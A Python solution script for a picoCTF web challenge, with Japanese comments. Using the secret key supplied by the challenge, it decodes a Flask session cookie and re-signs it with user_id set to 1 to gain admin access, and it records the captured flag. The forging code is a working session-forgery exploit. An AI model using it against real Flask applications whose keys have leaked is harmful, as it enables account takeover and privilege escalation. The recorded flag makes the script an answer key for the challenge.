#!/usr/bin/env python

# LoginしたときにもらったSessionCookieを問題分で与えられたSecret_keyでDecodeすると
# user_idがふられている。user_idを1（Adminは1と予想）にしてSekret_keyでEncodeし直したCookieを装備してアクセスする。
# Flag:picoCTF{1_id_to_rule_them_all_1879a381}

from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

sk = '06f4eefabf03b8f4e521fbdada13f65c'
sessionDict = {u'csrf_token': u'd85ce1ef76b7cfef80f88fa2ade9df1fe4ca5a0d', u'_fresh': True, u'user_id': u'1', u'_id': u'aba7ce760aff89982cec745a68d4ead292480530b9f97e7ab182125a67b3b52d0eea8e2932cb896d45b29ea45a4c192f7cd69fb8ddecb1e4f3d668d6314ad8bc'}
print(encodeFlaskCookie(sk, sessionDict))

cookie = '.eJwlj0tqAzEQBe-itRdSqyV1-zJDf4kxJDBjr0LubkHWxSte_ZYjz7i-yv11vuNWjoeXexGVZbFmlUxiJrCwhUMmOYY4MCDV0aty8ool2ggabL606wCvEUIB3MGUeDoOBQ7ZBrTGkMt8ciq5h2kLzO5zu2dvKE5q5VbsOvN4_Tzje_9xGhYtck1dlpFUkygFxIM9WwaaDKm-d-8rzv8IwPL3AdGLQko.Dr6aQw.rTO9ErbqKzYeigZKSHKALzlW0dg'

decodedDict = decodeFlaskCookie(sk, cookie)
# print(decodedDict)
